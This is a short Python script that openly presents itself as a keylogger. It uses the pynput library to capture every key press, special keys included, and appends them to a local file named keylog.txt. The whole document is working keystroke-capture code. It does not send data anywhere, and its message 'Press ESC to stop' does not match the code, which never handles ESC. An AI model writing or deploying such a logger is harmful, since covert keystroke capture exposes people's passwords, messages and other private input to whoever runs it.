import pynput.keyboard
import threading

log_file_path = "keylog.txt"

def callback_function(key):
    """Called when a key is pressed."""
    try:
        with open(log_file_path, "a") as log_file:  # Open the log file in append mode
            log_file.write(key.char)
    except AttributeError:
        # Handle special keys
        if key == pynput.keyboard.Key.space:
            with open(log_file_path, "a") as log_file:
                log_file.write(" ")
        else:
            with open(log_file_path, "a") as log_file:
                log_file.write(f' {str(key)} ')  # Log special keys

def start_logging():
    """Starts the keylogger."""
    with pynput.keyboard.Listener(on_press=callback_function) as keylogger_listener:
        keylogger_listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_logging()
